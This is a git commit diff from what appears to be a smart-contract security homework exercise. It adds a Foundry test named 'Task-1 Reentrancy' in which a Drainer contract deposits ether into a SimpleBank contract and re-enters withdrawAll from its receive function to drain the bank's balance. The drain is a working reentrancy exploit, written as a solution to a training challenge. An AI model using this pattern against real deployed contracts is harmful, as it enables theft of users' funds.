85231fba8f0d4ac2288ad0b31fc4e34078c1947e
finn79426 <finn79426@gmail.com>
2024-11-06 12:56:51 +0800

    Test OK: Task-1 Reentrancy

--- hw/test/SimpleBank/SimpleBank.t.sol
+++ hw/test/SimpleBank/SimpleBank.t.sol
@@ -2,10 +2,34 @@
 pragma solidity ^0.8.16;
 
 import {SimpleBankBaseTest} from "test/SimpleBank/SimpleBankBase.t.sol";
+import {SimpleBank} from "src/SimpleBank/SimpleBank.sol";
 
 contract SimpleBankTest is SimpleBankBaseTest {
     function testSimpleBankExploit() public checkSolved {
         // DO NOT use any cheat codes here.
         // @todo drain all ETH from SimpleBank contract
+        Drainer drainer = new Drainer(simpleBank);
+        drainer.start{value: 1 ether}();
+    }
+}
+
+contract Drainer {
+    SimpleBank simpleBank;
+    address player;
+
+    constructor(SimpleBank _simpleBank) {
+        simpleBank = _simpleBank;
+        player = msg.sender;
+    }
+
+    function start() public payable {
+        simpleBank.deposit{value: msg.value}();
+        simpleBank.withdrawAll();
+    }
+
+    receive() external payable {
+        try simpleBank.withdrawAll() {} catch {
+            payable(player).transfer(address(this).balance);
+        }
     }
 }
